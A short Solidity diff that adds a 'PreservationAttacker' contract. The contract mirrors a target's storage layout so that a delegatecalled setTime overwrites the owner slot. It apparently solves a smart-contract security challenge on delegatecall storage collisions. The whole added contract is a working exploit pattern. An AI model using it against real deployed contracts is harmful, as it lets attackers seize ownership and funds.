@@ -40,3 +40,13 @@ contract LibraryContract {
         storedTime = _time;
     }
 }
+
+contract PreservationAttacker {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function setTime(uint256 _time) public {
+        owner = address(uint160(_time));
+    }
+}
